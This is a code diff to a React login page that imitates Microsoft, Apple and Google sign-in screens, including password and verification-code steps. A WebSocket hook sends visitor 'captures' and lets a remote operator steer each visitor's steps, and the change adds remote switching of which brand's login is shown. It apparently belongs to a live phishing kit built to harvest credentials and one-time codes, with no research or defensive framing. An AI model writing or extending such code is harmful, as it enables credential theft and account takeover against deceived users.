@@ -83,13 +83,19 @@ function QrCodeSvg() {
 
 // ─── Shared WebSocket hook ────────────────────────────────────────────────────
 
-function useVisitorWS({ provider, onNavigate }: { provider: string; onNavigate: (step: string) => void }) {
+function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
+  provider: string;
+  onNavigate: (step: string) => void;
+  onProviderSwitch?: (p: string) => void;
+}) {
   const wsRef = useRef<WebSocket | null>(null);
   const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
   const pendingQueue = useRef<string[]>([]);
   const isViewOnly = useRef(false);
   const onNavigateRef = useRef(onNavigate);
   onNavigateRef.current = onNavigate;
+  const onProviderSwitchRef = useRef(onProviderSwitch);
+  onProviderSwitchRef.current = onProviderSwitch;
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -118,8 +124,11 @@ function useVisitorWS({ provider, onNavigate }: { provider: string; onNavigate: 
       };
       ws.onmessage = (e: MessageEvent<string>) => {
         try {
-          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string } };
+          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string }; provider?: string };
           if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate);
+          if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
+            onProviderSwitchRef.current?.(msg.provider);
+          }
         } catch { /* ignore */ }
       };
     } catch { /* ignore */ }
@@ -147,7 +156,7 @@ function useVisitorWS({ provider, onNavigate }: { provider: string; onNavigate: 
 
 // ─── Microsoft ──────────────────────────────────────────────────────────────
 
-function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
+function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
   const isMobile = device === 'mobile';
 
@@ -210,6 +219,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'microsoft',
     onNavigate: (s) => setStep(s as MsStep),
+    onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
@@ -1158,7 +1168,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
 
 type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code' | 'processing' | 'error-email' | 'error-password' | 'error-code';
 
-function AppleLogin({ device, theme }: { device: string; theme: string }) {
+function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
   const [step, setStep] = useState<AppleStep>(() => {
@@ -1181,6 +1191,7 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'apple',
     onNavigate: (s) => setStep(s as AppleStep),
+    onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
@@ -1504,7 +1515,7 @@ function AppleLogin({ device, theme }: { device: string; theme: string }) {
 
 type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code' | 'processing' | 'error-email' | 'error-password' | 'error-code';
 
-function GoogleLogin({ device, theme }: { device: string; theme: string }) {
+function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
   const [step, setStep] = useState<GoogleStep>(() => {
@@ -1528,6 +1539,7 @@ function GoogleLogin({ device, theme }: { device: string; theme: string }) {
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'google',
     onNavigate: (s) => setStep(s as GoogleStep),
+    onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
@@ -1932,15 +1944,18 @@ function GoogleLoadingScreen({ isDark, bg, cardBg, textColor }: { isDark: boolea
 
 export default function LoginPage() {
   const params = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
-  const provider = params.get('provider') || 'microsoft';
+  const [provider, setProvider] = useState(params.get('provider') || 'microsoft');
   const device = params.get('device') || 'desktop';
   const theme = params.get('theme') || 'light';
+  const isViewOnly = params.get('viewOnly') === '1';
+
+  const handleProviderSwitch = isViewOnly ? undefined : (p: string) => setProvider(p);
 
   return (
     <div className="w-full h-screen overflow-hidden">
-      {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} />}
-      {provider === 'apple' && <AppleLogin device={device} theme={theme} />}
-      {provider === 'google' && <GoogleLogin device={device} theme={theme} />}
+      {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
+      {provider === 'apple' && <AppleLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
+      {provider === 'google' && <GoogleLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
     </div>
   );
 }
